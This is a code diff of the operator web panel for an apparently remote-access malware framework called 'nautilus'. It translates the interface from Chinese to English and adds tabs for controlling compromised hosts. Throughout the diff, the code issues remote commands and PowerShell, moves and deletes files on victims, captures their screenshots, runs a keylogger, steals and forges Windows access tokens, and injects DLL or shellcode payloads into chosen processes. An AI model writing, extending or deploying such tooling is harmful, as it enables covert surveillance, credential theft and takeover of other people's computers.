+        <div class="file-list" id="file-list">
+          <div style="color:var(--dim);padding:24px;text-align:center">Enter a path and click Browse to view remote files</div>
         </div>
-        <input type="file" id="file-upload-input" style="display:none" onchange="handleFileUpload()">
+        <div class="file-bottom">
+          <div class="upload-row">
+            <button class="fbtn-sm" onclick="triggerUpload()">Upload</button>
+            <button class="fbtn-sm danger" onclick="promptFileDel()">Delete</button>
+            <span class="upload-status" id="upload-status"></span>
+          </div>
+          <div class="upload-area" onclick="triggerUpload()">
+            Click or drag file to upload to remote host
+          </div>
+          <input type="file" id="file-upload-input" style="display:none" onchange="handleFileUpload()">
+        </div>
+      </div>
+    </div>
+
+    <!-- Screenshot Tab -->
+    <div class="tab-panel" id="tab-screenshot">
+      <div class="screenshot-panel">
+        <div class="screenshot-toolbar">
+          <button class="sbtn" id="screenshot-btn" onclick="captureScreenshot()">Capture Screenshot</button>
+          <span class="sinfo" id="screenshot-count">0 captures</span>
+        </div>
+        <div class="screenshot-list" id="screenshot-list">
+          <div class="screenshot-empty" id="screenshot-empty">
+            <div class="s-icon">&#9635;</div>
+            <div>No screenshots captured</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Token Tab -->
+    <div class="tab-panel" id="tab-token">
+      <div class="token-panel">
+        <div class="token-toolbar">
+          <button class="tbtn primary" onclick="sendTask('tokens')">Enumerate</button>
+          <button class="tbtn" onclick="promptTask('steal_token')">Steal Token</button>
+          <button class="tbtn" onclick="promptMakeToken()">Make Token</button>
+          <button class="tbtn" onclick="sendTask('rev2self')">Rev2Self</button>
+        </div>
+        <div class="token-output" id="token-output">
+          <div class="token-empty">Token management panel - click Enumerate to list available tokens</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Keylog Tab -->
+    <div class="tab-panel" id="tab-keylog">
+      <div class="keylog-panel">
+        <div class="keylog-toolbar">
+          <button class="kbtn on" id="keylog-start-btn" onclick="startKeylog()">Start Keylog</button>
+          <button class="kbtn off" id="keylog-stop-btn" onclick="stopKeylog()">Stop &amp; Retrieve</button>
+          <span class="kstatus" id="keylog-status"></span>
+        </div>
+        <div class="keylog-output" id="keylog-output">
+          <div class="keylog-empty" id="keylog-empty">Keyboard logger panel - click Start to begin capturing</div>
+        </div>
       </div>
     </div>
   </div>
@@ -223,34 +364,138 @@ const API = '/admin';
 let authToken = localStorage.getItem('nautilus_token') || '';
 let activeSession = '';
 let ws = null;
-let pendingTasks = {}; // task_id -> {cmd, status}
+let pendingTasks = {};
+let keylogActive = false;
 
 const taskNames = {
-  'sysinfo': '系统信息', 'proclist': '进程列表', 'privinfo': '权限信息',
-  'listdir': '目录浏览', 'kill': '终止进程', 'exec': '执行命令',
-  'ps': '执行PS', 'filedel': '删除文件', 'fileread': '读取文件',
-  'filewrite': '写入文件', 'payload': '远程载荷', 'exit': '退出'
+  'sysinfo':'System Info','proclist':'Process List','privinfo':'Privilege Info',
+  'listdir':'List Directory','kill':'Kill Process','exec':'Execute Command',
+  'ps':'Execute PS','filedel':'Delete File','fileread':'Read File',
+  'filewrite':'Write File','payload':'Remote Payload','exit':'Exit',
+  'screenshot':'Screenshot','keylogon':'Keylog Start','keylogoff':'Keylog Stop',
+  'inject':'Process Inject',
+  'tokens':'Token Enum','steal_token':'Steal Token','rev2self':'Rev2Self','make_token':'Make Token',
 };
 
-// === Inline Dialog ===
+// === Dialog ===
 function showDialog(title, placeholder, defaultVal, callback) {
   const overlay = document.createElement('div');
   overlay.className = 'dialog-overlay';
-  overlay.innerHTML = `<div class="dialog-box"><h3>${title}</h3><input type="text" id="dialog-input" placeholder="${placeholder}" value="${defaultVal||''}"><div class="btn-row"><button class="btn-cancel" onclick="this.closest('.dialog-overlay').remove()">取消</button><button class="btn-ok" id="dialog-ok">确认</button></div></div>`;
+  overlay.innerHTML = `<div class="dialog-box"><h3>${title}</h3><label>INPUT</label><input type="text" id="dialog-input" placeholder="${placeholder}" value="${defaultVal||''}"><div class="btn-row"><button class="btn-cancel" onclick="this.closest('.dialog-overlay').remove()">Cancel</button><button class="btn-ok" id="dialog-ok">Confirm</button></div></div>`;
   document.body.appendChild(overlay);
   const input = overlay.querySelector('#dialog-input');
   input.focus();
-  input.onkeydown = (e) => { if(e.key==='Enter') { const val=input.value.trim(); overlay.remove(); if(val) callback(val); } };
-  overlay.querySelector('#dialog-ok').onclick = () => { const val=input.value.trim(); overlay.remove(); if(val) callback(val); };
-  overlay.onclick = (e) => { if(e.target===overlay) overlay.remove(); };
+  input.onkeydown = (e) => { if(e.key==='Enter'){const val=input.value.trim();overlay.remove();if(val)callback(val);}};
+  overlay.querySelector('#dialog-ok').onclick = () => {const val=input.value.trim();overlay.remove();if(val)callback(val);};
+  overlay.onclick = (e) => {if(e.target===overlay)overlay.remove();};
+}
+
+function showPidDialog(title, callback) {
+  const overlay = document.createElement('div');
+  overlay.className = 'dialog-overlay';
+  overlay.innerHTML = `<div class="dialog-box pid-dialog"><h3>${title}</h3><div class="pid-search"><input type="text" id="pid-search-input" placeholder="Search process name..."></div><div class="pid-list" id="pid-list"><div style="color:var(--dim);padding:20px;text-align:center">Loading process list...</div></div><div class="pid-footer"><span class="pid-selected" id="pid-selected-label">No process selected</span><div class="btn-row"><button class="btn-cancel" onclick="this.closest('.dialog-overlay').remove()">Cancel</button><button class="btn-ok" id="dialog-ok">Confirm</button></div></div></div>`;
+  document.body.appendChild(overlay);
+  overlay.onclick = (e) => {if(e.target===overlay)overlay.remove();};
+  
+  let selectedPid = '';
+  const searchInput = overlay.querySelector('#pid-search-input');
+  const pidList = overlay.querySelector('#pid-list');
+  const selectedLabel = overlay.querySelector('#pid-selected-label');
+  const okBtn = overlay.querySelector('#dialog-ok');
+  okBtn.style.opacity = '0.5';
+  
+  // Fetch proclist
+  fetchProclist().then(procs => {
+    if(!procs || !procs.length){
+      pidList.innerHTML = '<div style="color:var(--red);padding:20px;text-align:center">Failed to get process list</div>';
+      return;
+    }
+    renderProcList(procs, '');
+    searchInput.oninput = () => renderProcList(procs, searchInput.value.toLowerCase());
+    searchInput.focus();
+  });
+  
+  function renderProcList(procs, filter) {
+    pidList.innerHTML = '';
+    procs.forEach(p => {
+      if(filter && !p.name.toLowerCase().includes(filter) && !p.pid.toString().includes(filter)) return;
+      const row = document.createElement('div');
+      row.className = 'pid-row';
+      row.innerHTML = `<span class="pid-num">${p.pid}</span><span class="pid-name">${escapeHTML(p.name)}</span>`;
+      row.onclick = () => {
+        selectedPid = p.pid.toString();
+        selectedLabel.textContent = `PID ${p.pid} - ${p.name}`;
+        selectedLabel.style.color = 'var(--green)';
+        okBtn.style.opacity = '1';
+        // Highlight selected
+        pidList.querySelectorAll('.pid-row').forEach(r => r.classList.remove('pid-selected-row'));
+        row.classList.add('pid-selected-row');
+      };
+      pidList.appendChild(row);
+    });
+    if(!pidList.children.length){
+      pidList.innerHTML = '<div style="color:var(--dim);padding:10px;text-align:center">No matching processes</div>';
+    }
+  }
+  
+  okBtn.onclick = () => {if(selectedPid){overlay.remove();callback(selectedPid);}};
+  searchInput.onkeydown = (e) => { if(e.key==='Enter' && selectedPid){overlay.remove();callback(selectedPid);}};
+}
+
+let cachedProclist = null; // Cache proclist results
+
+async function fetchProclist() {
+  if(!activeSession) return null;
+  
+  // If we have cached data, use it directly
+  if(cachedProclist && cachedProclist.length > 0) return cachedProclist;
+  
+  try {
+    // Send proclist task and wait for WS result
+    const promise = waitForTaskResult('proclist', 30000);
+    const r = await apiAuth('/task','POST',{session_id:activeSession, task_type:'proclist', params:{}});
+    if(!r){ delete taskResultResolvers['proclist']; return null; }
+    const procs = await promise;
+    if(procs && procs.length > 0) cachedProclist = procs;
+    return procs;
+  } catch(e) { console.error('fetchProclist error', e); }
+  return null;
+}
+
+let taskResultResolvers = {};
+
+function waitForTaskResult(taskType, timeout) {
+  return new Promise((resolve) => {
+    taskResultResolvers[taskType] = resolve;
+    setTimeout(() => { delete taskResultResolvers[taskType]; resolve(null); }, timeout);
+  });
+}
+
+function parseProclist(output) {
+  const lines = output.split('\n');
+  const procs = [];
+  lines.forEach(line => {
+    line = line.trim();
+    if(!line) return;
+    // tasklist CSV format: "name.exe","PID","Session","Session#","Mem"
+    const csv = line.match(/^"([^"]+)","(\d+)"/);
+    if(csv){
+      procs.push({pid: parseInt(csv[2]), name: csv[1]});
+      return;
+    }
+    // Linux ps format: PID ... name
+    const ps = line.match(/^\s*(\d+)\s+(.+)/);
+    if(ps) procs.push({pid: parseInt(ps[1]), name: ps[2].trim()});
+  });
+  return procs;
 }
 
 function showAlert(msg) {
   const overlay = document.createElement('div');
   overlay.className = 'dialog-overlay';
-  overlay.innerHTML = `<div class="dialog-box"><h3>${msg}</h3><div class="btn-row"><button class="btn-ok" onclick="this.closest('.dialog-overlay').remove()">确定</button></div></div>`;
+  overlay.innerHTML = `<div class="dialog-box"><h3>${msg}</h3><div class="btn-row"><button class="btn-ok" onclick="this.closest('.dialog-overlay').remove()">OK</button></div></div>`;
   document.body.appendChild(overlay);
-  overlay.onclick = (e) => { if(e.target===overlay) overlay.remove(); };
+  overlay.onclick = (e) => {if(e.target===overlay)overlay.remove();};
 }
 
 // === Auth ===
@@ -258,7 +503,7 @@ async function doLogin() {
   const u = document.getElementById('login-user').value;
   const p = document.getElementById('login-pass').value;
   try {
-    const r = await fetch(API+'/login', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,password:p})});
+    const r = await fetch(API+'/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,password:p})});
     const data = await r.json();
     if (data.token) {
       authToken = data.token;
@@ -275,7 +520,7 @@ async function doLogin() {
 function doLogout() {
   authToken = '';
   localStorage.removeItem('nautilus_token');
-  if (ws) ws.close();
+  if(ws) ws.close();
   document.getElementById('app-screen').style.display = 'none';
   document.getElementById('login-screen').style.display = 'flex';
 }
@@ -290,225 +535,513 @@ function showApp() {
 // === API ===
 async function apiAuth(path, method, body) {
   const opts = {method, headers:{'Content-Type':'application/json','Authorization':authToken}};
-  if (body) opts.body = JSON.stringify(body);
+  if(body) opts.body = JSON.stringify(body);
   const r = await fetch(API+path, opts);
-  if (r.status === 401) { doLogout(); return null; }
+  if(r.status===401){doLogout();return null;}
   return r.json();
 }
 
 // === WebSocket ===
 function connectWS() {
-  const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+  const proto = location.protocol==='https:'?'wss:':'ws:';
   ws = new WebSocket(proto+'//'+location.host+'/ws?token='+authToken);
   ws.onopen = () => {
-    document.getElementById('ws-status').textContent = 'WS: 已连接';
-    document.getElementById('ws-status').className = 'ws-status connected';
+    document.getElementById('ws-dot').className='ws-dot on';
+    document.getElementById('ws-status').textContent='CONNECTED';
   };
   ws.onclose = () => {
-    document.getElementById('ws-status').textContent = 'WS: 断开';
-    document.getElementById('ws-status').className = 'ws-status disconnected';
+    document.getElementById('ws-dot').className='ws-dot off';
+    document.getElementById('ws-status').textContent='DISCONNECTED';
     setTimeout(connectWS, 3000);
   };
   ws.onmessage = (e) => {
     const evt = JSON.parse(e.data);
-    if (evt.type === 'session_new') {
+    if(evt.type==='session_new'){
       refreshSessions();
-      addOutput('新会话上线', `${evt.data.hostname} | ${evt.data.username} | ${evt.data.os}`, 'success');
+      termPrint(`[+] New session online: ${evt.data.hostname} | ${evt.data.username} | ${evt.data.os}`, 't-banner');
     }
-    if (evt.type === 'task_result') {
+    if(evt.type==='task_result'){
       handleTaskResult(evt.data);
     }
   };
 }
 
+// === Terminal Output ===
+function termPrint(text, cls) {
+  const output = document.getElementById('term-output');
+  const line = document.createElement('div');
+  line.className = 't-line ' + (cls||'t-result');
+  line.textContent = text;
+  output.appendChild(line);
+  output.scrollTop = output.scrollHeight;
+  return line;
+}
+
+function termPrintHTML(html, cls) {
+  const output = document.getElementById('term-output');
+  const line = document.createElement('div');
+  line.className = 't-line ' + (cls||'t-result');
+  line.innerHTML = html;
+  output.appendChild(line);
+  output.scrollTop = output.scrollHeight;
+  return line;
+}
+
+function termAddPending(cmdText, taskType, params) {
+  const output = document.getElementById('term-output');
+  const line = document.createElement('div');
+  line.className = 't-line t-pending';
+  line.dataset.taskType = taskType;
+  line.dataset.taskId = '';
+  if(params && params.path) line.dataset.taskPath = params.path;
+  const now = new Date().toLocaleTimeString();
+  line.innerHTML = `<span class="t-cmd">[${now}] ${cmdText}</span> <span class="pending-label">pending...</span>`;
+  output.appendChild(line);
+  output.scrollTop = output.scrollHeight;
+  return line;
+}
+
+function termClear() {
+  document.getElementById('term-output').innerHTML = '';
+}
+
+// === Handle Task Results ===
 function handleTaskResult(data) {
-  // 通过task_id精确匹配，或按类型+pending状态模糊匹配
-  const entries = Array.from(document.querySelectorAll('.entry'));
+  // Resolve pending WS promise for proclist
+  const taskType = data.task_type || '';
+  if(taskType === 'proclist'){
+    const procs = parseProclist(data.output || '');
+    // Cache for PID dialog use
+    if(procs && procs.length > 0) cachedProclist = procs;
+    // Resolve pending WS promise
+    if(taskResultResolvers['proclist']){
+      taskResultResolvers['proclist'](procs);
+      delete taskResultResolvers['proclist'];
+    }
+  }
+  
+  // Find matching terminal entry
+  const entries = Array.from(document.querySelectorAll('#term-output .t-line'));
   let matched = null;
 
-  // 优先按task_id精确匹配
-  for (let e of entries) {
-    if (e.dataset.taskId && e.dataset.taskId == data.task_id) {
-      matched = e;
-      break;
+  for(let e of entries){
+    if(e.dataset.taskId && e.dataset.taskId == data.task_id){
+      matched = e; break;
     }
   }
 
-  // 如果没有精确匹配，按类型+pending状态匹配（只匹配同类型的pending条目）
-  if (!matched) {
-    // task_id无法直接映射类型，通过pending状态+taskType匹配
-    for (let e of entries) {
-      const isPending = e.querySelector('.meta').textContent.includes('等待中') || e.querySelector('.meta').textContent.includes('正在读取') || e.querySelector('.meta').textContent.includes('任务已下发');
-      if (isPending) {
-        // fileread结果只匹配fileread条目，listdir结果只匹配listdir条目
-        if (e.dataset.taskType === 'fileread' && pendingDownload) {
-          matched = e;
-          break;
-        } else if (e.dataset.taskType === 'listdir') {
-          matched = e;
-          break;
-        } else if (!pendingDownload && e.dataset.taskType !== 'fileread' && e.dataset.taskType !== 'listdir') {
-          matched = e;
-          break;
+  if(!matched){
+    for(let e of entries){
+      if(e.classList.contains('t-pending')){
+        if(e.dataset.taskType === 'fileread' && pendingDownload){
+          matched = e; break;
+        } else if(e.dataset.taskType === data.task_type){
+          matched = e; break;
+        } else if(!pendingDownload && e.dataset.taskType !== 'fileread' && e.dataset.taskType !== 'listdir'){
+          matched = e; break;
         }
       }
     }
   }
 
-  if (!matched) {
-    // 没有匹配条目，fileread结果单独处理
-    if (pendingDownload && data.task_id) {
-      if (data.success && data.output) {
-        try {
-          const b64 = data.output.trim();
-          const binary = atob(b64);
-          const bytes = new Uint8Array(binary.length);
-          for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
-          const blob = new Blob([bytes]);
-          const url = URL.createObjectURL(blob);
-          const a = document.createElement('a');
-          a.href = url; a.download = pendingDownload.fileName; a.click();
-          URL.revokeObjectURL(url);
-          addOutput('下载文件: '+pendingDownload.fileName, `文件已下载 (${bytes.length} bytes)`, 'success');
-        } catch(err) {
-          addOutput('下载文件: '+pendingDownload.fileName, `下载失败: ${err.message}`, 'error');
-        }
-      } else {
-        addOutput('下载文件: '+pendingDownload.fileName, `下载失败: ${data.error || '未知错误'}`, 'error');
-      }
-      pendingDownload = null;
+  const isSuccess = data.success;
+  const outputText = data.output || '';
+  const errorText = data.error || '';
+  const now = new Date().toLocaleTimeString();
+  const statusLabel = isSuccess ? 'OK' : 'FAIL';
+
+  // Route to appropriate panel based on task type
+  // taskType already declared above
+
+  // Screenshot -> Screenshot tab
+  if(taskType === 'screenshot'){
+    handleScreenshotResult(data);
+    if(matched){
+      matched.className = 't-line ' + (isSuccess ? 't-info' : 't-error');
+      matched.innerHTML = `<span class="t-cmd">[${now}] Screenshot</span> <span class="${isSuccess?'t-info':'t-error'}">${isSuccess?'Captured - see Screenshot tab':errorText}</span>`;
+      if(data.task_id) matched.dataset.taskId = data.task_id;
     }
     refreshSessions();
     return;
   }
 
-  matched.querySelector('.meta').textContent = `${new Date().toLocaleTimeString()} | ${data.success ? '完成' : '失败'} | 会话:${(data.session_id||'').substring(0,8)}`;
-  matched.className = 'entry ' + (data.success ? 'success' : 'error');
-  let resultText = data.output || data.error || '(无输出)';
-  matched.querySelector('.result').textContent = resultText;
-
-  // 设置task_id以便后续精确匹配
-  if (data.task_id) matched.dataset.taskId = data.task_id;
-
-  if (matched.dataset.taskType === 'listdir' && data.success) {
-    renderFileList(data.output, matched.dataset.taskPath || '');
-  }
-  // 文件下载处理
-  if (pendingDownload) {
-    if (data.success && data.output) {
-      try {
-        const b64 = data.output.trim();
-        const binary = atob(b64);
-        const bytes = new Uint8Array(binary.length);
-        for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
-        const blob = new Blob([bytes]);
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url; a.download = pendingDownload.fileName; a.click();
-        URL.revokeObjectURL(url);
-        matched.querySelector('.result').textContent = `文件已下载: ${pendingDownload.fileName} (${bytes.length} bytes)`;
-      } catch(err) {
-        matched.querySelector('.result').textContent = `下载失败: ${err.message}\n原始输出:\n${resultText.substring(0,200)}`;
-      }
-    } else {
-      matched.querySelector('.result').textContent = `下载失败: ${data.error || '文件不可访问'}`;
+  // Keylogoff -> Keylog tab
+  if(taskType === 'keylogoff'){
+    handleKeylogResult(data);
+    if(matched){
+      matched.className = 't-line ' + (isSuccess ? 't-info' : 't-error');
+      matched.innerHTML = `<span class="t-cmd">[${now}] Keylog Stop</span> <span class="${isSuccess?'t-info':'t-error'}">${isSuccess?'Results in Keylog tab':errorText}</span>`;
+      if(data.task_id) matched.dataset.taskId = data.task_id;
     }
-    pendingDownload = null;
+    keylogActive = false;
+    keylogHasData = false;
+    updateKeylogStatus();
+    refreshSessions();
+    return;
   }
+
+  // Keylogon
+  if(taskType === 'keylogon'){
+    if(data.success){
+      keylogActive = true;
+      updateKeylogStatus();
+      // Show feedback in keylog panel
+      const klOutput = document.getElementById('keylog-output');
+      const klEmpty = document.getElementById('keylog-empty');
+      if(klEmpty) klEmpty.remove();
+      const now = new Date().toLocaleTimeString();
+      const div = document.createElement('div');
+      div.style.cssText = 'margin-bottom:12px;padding:8px;background:var(--surface);border-radius:4px;border-left:3px solid var(--green)';
+      div.innerHTML = `<span style="color:var(--dim);font-size:11px">${now}</span> <span style="color:var(--green)">Keylogger started - recording keystrokes...</span>`;
+      klOutput.appendChild(div);
+    } else {
+      const status = document.getElementById('keylog-status');
+      status.textContent = 'Failed';
+      status.className = 'kstatus';
+      document.getElementById('keylog-start-btn').disabled = false;
+      document.getElementById('keylog-start-btn').style.opacity = '1';
+    }
+  }
+
+  // Token results -> Token tab (also show in terminal)
+  if(taskType === 'tokens' || taskType === 'steal_token' || taskType === 'rev2self' || taskType === 'make_token'){
+    handleTokenResult(data);
+  }
+
+  // Listdir -> File tab
+  if(taskType === 'listdir' && data.success){
+    renderFileList(data.output, matched ? (matched.dataset.taskPath||'') : '');
+  }
+
+  // No match found in terminal - handle orphan results
+  if(!matched){
+    if(pendingDownload && data.task_id){
+      handleFileDownload(data);
+      refreshSessions();
+      return;
+    }
+    // Print as orphan
+    termPrint(`[${now}] Result: ${isSuccess ? outputText.substring(0,500) : errorText}`, isSuccess ? 't-result' : 't-error');
+    refreshSessions();
+    return;
+  }
+
+  // Update terminal entry
+  matched.className = 't-line ' + (isSuccess ? 't-result' : 't-error');
+  if(data.task_id) matched.dataset.taskId = data.task_id;
+
+  let displayText = isSuccess ? outputText : errorText;
+  if(!displayText) displayText = '(no output)';
+
+  // File download handling
+  if(pendingDownload){
+    handleFileDownload(data);
+    matched.innerHTML = `<span class="t-cmd">[${now}] Download: ${pendingDownload.fileName}</span> <span class="t-info">Downloaded</span>`;
+    pendingDownload = null;
+    refreshSessions();
+    return;
+  }
+
+  // Truncate very long output in terminal
+  const truncated = displayText.length > 2000 ? displayText.substring(0,2000) + '\n... (output truncated)' : displayText;
+  matched.innerHTML = `<span class="t-cmd">[${now}] ${taskNames[taskType]||taskType}</span> <span class="${isSuccess?'t-result':'t-error'}">${escapeHTML(truncated)}</span>`;
+
   refreshSessions();
+}
+
+function escapeHTML(str) {
+  const div = document.createElement('div');
+  div.textContent = str;
+  return div.innerHTML;
+}
+
+// === Screenshot Handler ===
+function handleScreenshotResult(data) {
+  // Reset button state
+  const btn = document.getElementById('screenshot-btn');
+  if(btn){btn.disabled = false; btn.textContent = 'Capture Screenshot';}
+  
+  if(!data.success || !data.output){
+    return;
+  }
+  const list = document.getElementById('screenshot-list');
+  const empty = document.getElementById('screenshot-empty');
+  if(empty) empty.remove();
+
+  const b64 = data.output.trim();
+  const imgSrc = 'data:image/png;base64,' + b64;
+  const now = new Date().toLocaleString();
+  const sid = (activeSession||'unknown').substring(0,8);
+
+  const card = document.createElement('div');
+  card.className = 'screenshot-card';
+  card.innerHTML = `
+    <img src="${imgSrc}" onclick="openFullImage(this.src)" title="Click to enlarge">
+    <div class="sc-footer">
+      <span class="sc-time">${now} | ${sid}</span>
+      <button class="sc-dl" onclick="downloadScreenshot(this)">Save</button>
+    </div>`;
+  list.insertBefore(card, list.firstChild);
+
+  // Update count
+  const cards = list.querySelectorAll('.screenshot-card');
+  document.getElementById('screenshot-count').textContent = cards.length + ' capture' + (cards.length!==1?'s':'');
+}
+
+async function captureScreenshot() {
+  if(!activeSession){showAlert('No active session');return;}
+  const btn = document.getElementById('screenshot-btn');
+  btn.disabled = true;
+  btn.textContent = 'Capturing...';
+  await sendTask('screenshot');
+}
+
+function openFullImage(src) {
+  const w = window.open('');
+  w.document.write('<html><head><title>Screenshot</title><style>body{margin:0;background:#000;display:flex;align-items:center;justify-content:center;min-height:100vh}img{max-width:100%;max-height:100vh}</style></head><body><img src="'+src+'"></body></html>');
+}
+
+function downloadScreenshot(btn) {
+  const card = btn.closest('.screenshot-card');
+  const img = card.querySelector('img');
+  const a = document.createElement('a');
+  a.href = img.src;
+  a.download = 'screenshot_' + Date.now() + '.png';
+  a.click();
+}
+
+// === Keylog Handler ===
+function handleKeylogResult(data) {
+  const container = document.getElementById('keylog-output');
+  const empty = document.getElementById('keylog-empty');
+  if(empty) empty.remove();
+
+  const now = new Date().toLocaleString();
+
+  if(!data.success || !data.output){
+    const div = document.createElement('div');
+    div.style.cssText = 'margin-bottom:12px;padding:10px;background:var(--surface);border-radius:4px;border-left:3px solid var(--red)';
+    div.innerHTML = `<div style="color:var(--dim);font-size:11px;margin-bottom:4px">${now} | Keylog Result</div><pre style="color:var(--red);margin:0">${escapeHTML(data.error||'No data')}</pre>`;
+    container.appendChild(div);
+    return;
+  }
+
+  const div = document.createElement('div');
+  div.style.cssText = 'margin-bottom:12px;padding:10px;background:var(--surface);border-radius:4px;border-left:3px solid var(--green)';
+  div.innerHTML = `<div style="color:var(--dim);font-size:11px;margin-bottom:6px">${now} | Keylog Capture</div><pre style="color:var(--green);white-space:pre-wrap;word-break:break-all;margin:0">${escapeHTML(data.output)}</pre>`;
+  container.appendChild(div);
+  container.scrollTop = container.scrollHeight;
+}
+
+function updateKeylogStatus() {
+  const status = document.getElementById('keylog-status');
+  const startBtn = document.getElementById('keylog-start-btn');
+  const stopBtn = document.getElementById('keylog-stop-btn');
+  if(keylogActive){
+    status.textContent = 'RECORDING';
+    status.className = 'kstatus recording';
+    startBtn.disabled = true;
+    startBtn.style.opacity = '0.4';
+    stopBtn.disabled = false;
+    stopBtn.style.opacity = '1';
+  } else {
+    status.textContent = '';
+    status.className = 'kstatus';
+    startBtn.disabled = false;
+    startBtn.style.opacity = '1';
+    stopBtn.disabled = !keylogHasData;
+    stopBtn.style.opacity = keylogHasData ? '1' : '0.6';
+  }
+}
+
+let keylogHasData = false;
+
+async function startKeylog() {
+  if(!activeSession){showAlert('No active session');return;}
+  if(keylogActive){showAlert('Keylogger is already running');return;}
+  const status = document.getElementById('keylog-status');
+  status.textContent = 'Starting...';
+  status.className = 'kstatus';
+  document.getElementById('keylog-start-btn').disabled = true;
+  await sendTask('keylogon');
+}
+
+async function stopKeylog() {
+  if(!activeSession){showAlert('No active session');return;}
+  if(!keylogActive){showAlert('Keylogger is not running');return;}
+  const status = document.getElementById('keylog-status');
+  status.textContent = 'Stopping...';
+  status.className = 'kstatus';
+  document.getElementById('keylog-stop-btn').disabled = true;
+  await sendTask('keylogoff');
+}
+
+// === Token Handler ===
+function handleTokenResult(data) {
+  const container = document.getElementById('token-output');
+  // Remove empty state
+  const empty = container.querySelector('.token-empty');
+  if(empty) empty.remove();
+
+  const now = new Date().toLocaleString();
+  const taskType = data.task_type || '';
+  const label = taskNames[taskType] || taskType;
+
+  const div = document.createElement('div');
+  div.style.cssText = 'margin-bottom:12px;padding:10px;background:var(--surface);border-radius:4px;border-left:3px solid '+(data.success?'var(--cyan)':'var(--red)');
+
+  if(data.success && data.output){
+    div.innerHTML = `<div style="color:var(--dim);font-size:11px;margin-bottom:6px">${now} | ${label}</div><div class="t-result">${escapeHTML(data.output)}</div>`;
+  } else {
+    div.innerHTML = `<div style="color:var(--dim);font-size:11px;margin-bottom:6px">${now} | ${label}</div><div class="t-error">${escapeHTML(data.error||'Failed')}</div>`;
+  }
+  container.appendChild(div);
+  container.scrollTop = container.scrollHeight;
+}
+
+function promptMakeToken() {
+  showDialog('Make Token', 'domain\\user:password', '', (val) => {
+    const parts = val.split(':');
+    if(parts.length < 3){
+      const domainUser = parts[0] || '';
+      const password = parts.slice(1).join(':') || '';
+      sendTask('make_token', {action:'make', domain:'', username:domainUser, password:password});
+    } else {
+      sendTask('make_token', {action:'make', domain:parts[0], username:parts[1], password:parts.slice(2).join(':')});
+    }
+  });
 }
 
 // === Sessions ===
 async function refreshSessions() {
-  const data = await apiAuth('/sessions', 'GET');
-  if (!data) return;
+  const data = await apiAuth('/sessions','GET');
+  if(!data) return;
   const list = document.getElementById('session-list');
   const count = document.getElementById('session-count');
   count.textContent = data.sessions ? data.sessions.length : 0;
   activeSession = data.active_session || '';
-  document.getElementById('active-label').textContent = activeSession ? '会话: '+activeSession.substring(0,8) : '无活跃会话';
+
+  const label = document.getElementById('active-label');
+  if(activeSession){
+    label.innerHTML = `<span>Active:</span> <span class="sid">${activeSession.substring(0,8)}</span>`;
+  } else {
+    label.textContent = 'No active session';
+  }
 
   list.innerHTML = '';
   (data.sessions || []).forEach(s => {
     const div = document.createElement('div');
-    div.className = 'session-item' + (s.id === activeSession ? ' active' : '');
+    div.className = 'session-item' + (s.id===activeSession?' active':'');
     const statusClass = s.status || 'active';
-    div.innerHTML = `<div class="dot ${statusClass}"></div><div class="info"><div class="name">${s.hostname||s.id.substring(0,12)}</div><div class="meta">${s.username||''} | ${s.os||''} | ${s.last_seen||''}</div></div>`;
+    div.innerHTML = `
+      <div class="dot ${statusClass}"></div>
+      <div class="info">
+        <div class="name">${s.hostname||s.id.substring(0,12)}</div>
+        <div class="meta">
+          <span>${s.username||'-'}</span>
+          <span>${s.os||'-'}</span>
+          <span>${s.ip||'-'}</span>
+        </div>
+      </div>`;
     div.onclick = () => switchSession(s.id);
     list.appendChild(div);
   });
 }
 
 async function switchSession(id) {
-  await apiAuth('/use', 'POST', {session_id: id});
+  await apiAuth('/use','POST',{session_id:id});
   await refreshSessions();
 }
 
 // === Tasks ===
 async function sendTask(type, params) {
-  if (!activeSession) { showAlert('无活跃会话'); return; }
-  const r = await apiAuth('/task', 'POST', {session_id: activeSession, task_type: type, params: params||{}});
-  if (!r) return;
-  const entry = addOutput(taskNames[type]||type, '任务已下发，等待回传...', 'pending');
-  entry.dataset.taskType = type;
-  if (params && params.path) entry.dataset.taskPath = params.path;
+  if(!activeSession){showAlert('No active session');return;}
+  params = params || {};
+  if(type==='tokens') params.action='enum';
+  else if(type==='steal_token') params.action='steal';
+  else if(type==='rev2self') params.action='rev2self';
+  else if(type==='make_token') params.action='make';
+
+  const r = await apiAuth('/task','POST',{session_id:activeSession,task_type:type,params:params});
+  if(!r) return;
+
+  const entry = termAddPending(taskNames[type]||type, type, params);
+  return entry;
 }
 
 async function promptTask(type) {
-  let label = type==='kill'?'进程PID':type==='filedel'?'文件路径':type==='fileread'?'下载文件路径':'目录路径';
-  let paramKey = type==='kill'?'pid':'path';
-  showDialog(label, '请输入'+label, '', (val) => sendTask(type, {[paramKey]: val}));
+  const pidTasks = ['kill','steal_token'];
+  if(pidTasks.includes(type)){
+    const labels = {'kill':'Kill Process','steal_token':'Steal Token - Select Target'};
+    showPidDialog(labels[type], (pid) => {
+      sendTask(type, {pid:pid});
+    });
+    return;
+  }
+  if(type === 'inject'){
+    showPidDialog('Inject Payload - Select Target', (pid) => {
+      showDialog('Payload Path', 'Enter path to payload DLL/shellcode', '', (path) => {
+        sendTask(type, {pid:pid, path:path});
+      });
+    });
+    return;
+  }
+  const map = {
+    'filedel':['File path','path'],
+    'fileread':['Download file path','path'],
+    'listdir':['Directory path','path'],
+  };
+  const [label, key] = map[type] || ['Parameter','param'];
+  showDialog(label, 'Enter '+label, '', (val) => {
+    sendTask(type, {[key]:val});
+  });
 }
 
 async function execCmd() {
   const input = document.getElementById('cmd-input');
   const cmd = input.value.trim();
-  if (!cmd) return;
+  if(!cmd) return;
   input.value = '';
   let taskType = 'exec';
-  if (cmd.toLowerCase().startsWith('ps ') || cmd.toLowerCase().startsWith('powershell ')) taskType = 'ps';
-  sendTask(taskType, {command: cmd});
+  if(cmd.toLowerCase().startsWith('ps ')||cmd.toLowerCase().startsWith('powershell ')) taskType='ps';
+  // Clear command
